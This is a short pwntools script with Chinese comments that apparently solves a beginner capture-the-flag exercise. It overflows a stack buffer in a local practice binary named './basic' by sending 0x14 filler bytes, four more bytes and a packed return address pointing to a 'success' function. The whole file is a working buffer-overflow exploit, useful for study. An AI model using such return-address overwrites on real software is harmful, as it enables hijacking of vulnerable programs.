

##coding=utf8
from pwn import *
## 构造与程序交互的对象

def main():
    sh = process('./basic')
    success_addr = 0x080491B6

    print (p32(success_addr))
    ## 构造payload
    payload = 'a' * 0x14 + 'bbbb' + p32(success_addr).decode('unicode_escape')

    ## 向程序发送字符串
    sh.sendline(payload)

    ## 将代码交互转换为手工交互
    sh.interactive()

if __name__ == "__main__":
    main()

